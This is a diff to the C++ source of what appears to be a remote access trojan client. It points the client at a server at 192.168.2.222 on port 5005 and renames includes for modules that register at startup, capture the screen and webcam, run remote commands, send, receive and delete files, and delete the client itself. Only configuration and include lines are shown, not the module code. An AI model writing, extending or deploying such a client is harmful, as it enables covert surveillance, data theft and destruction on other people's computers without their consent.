@@ -5,7 +5,7 @@
 #include <dirent.h>
 #include <dshow.h>
 
-const std::string SERVER = "localhost";
+const std::string SERVER = "192.168.2.222";
 const int PORT = 5005;
 
 std::vector<std::string> logs;
@@ -21,26 +21,26 @@ char buffer[16384];
 const bool startup = false;
 const int timeout = 300000;
 
-#include "components/utilities.h"
-#include "components/RegisterStartup.cpp"
-#include "components/VBSMessageBox.cpp"
-#include "components/CaptureScreenshot.cpp"
-#include "components/CaptureWebcam.cpp"
-#include "components/ChangeWallpaper.cpp"
-#include "components/ViewTasks.cpp"
-#include "components/IdleTime.cpp"
-#include "components/StartProcess.cpp"
-#include "components/KillProcess.cpp"
-#include "components/RemoteCMD.cpp"
-#include "components/WakeComputer.cpp"
-#include "components/ViewFiles.cpp"
-#include "components/SendFile.cpp"
-#include "components/ReceiveFile.cpp"
-#include "components/ReadFile.cpp"
-#include "components/MoveFile.cpp"
-#include "components/DeleteFile.cpp"
-#include "components/DeleteDirectory.cpp"
-#include "components/DeleteSelf.cpp"
+#include "functions/utilities.h"
+#include "functions/RegisterStartup.cpp"
+#include "functions/VBSMessageBox.cpp"
+#include "functions/CaptureScreenshot.cpp"
+#include "functions/CaptureWebcam.cpp"
+#include "functions/ChangeWallpaper.cpp"
+#include "functions/ViewTasks.cpp"
+#include "functions/IdleTime.cpp"
+#include "functions/StartProcess.cpp"
+#include "functions/KillProcess.cpp"
+#include "functions/RemoteCMD.cpp"
+#include "functions/WakeComputer.cpp"
+#include "functions/ViewFiles.cpp"
+#include "functions/SendFile.cpp"
+#include "functions/ReceiveFile.cpp"
+#include "functions/ReadFile.cpp"
+#include "functions/MoveFile.cpp"
+#include "functions/DeleteFile.cpp"
+#include "functions/DeleteDirectory.cpp"
+#include "functions/DeleteSelf.cpp"
 
 void Client()
 {
